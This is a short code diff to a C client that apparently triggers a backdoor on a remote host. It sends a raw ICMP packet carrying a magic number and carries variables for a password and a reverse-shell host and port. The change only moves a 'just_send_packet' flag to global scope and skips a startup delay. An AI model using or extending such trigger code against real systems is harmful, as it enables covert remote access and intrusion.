@@ -23,6 +23,7 @@
 #define DEBUG "\033[38;5;202m[*]\033[0m "
 
 bool verbose = false;
+bool just_send_packet = false;
 
 void usage(const char *bin_name) {
   printf("use:\n");
@@ -145,7 +146,10 @@ int icmp(char *srcip, char *dstip, int magic_number, char *data) {
   s.sin_family = AF_INET;
   s.sin_addr.s_addr = inet_addr(dstip);
 
-  sleep(4);  // wait lister start
+  if (!just_send_packet) {
+    sleep(4);  // wait lister start
+  }
+
   if ((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *)&s,
                        sizeof(struct sockaddr))) == -1)
     fprintf(stderr, BAD "error on sending package\n");
@@ -169,7 +173,6 @@ free_buffer:
 int main(int argc, char *argv[]) {
   char *srcip = "127.0.0.1", *dstip, *pass, *rev_host, *rev_port, *data;
   int opt, magic_number;
-  bool just_send_packet = false;
   pid_t pid;
 
   magic_number = 0;
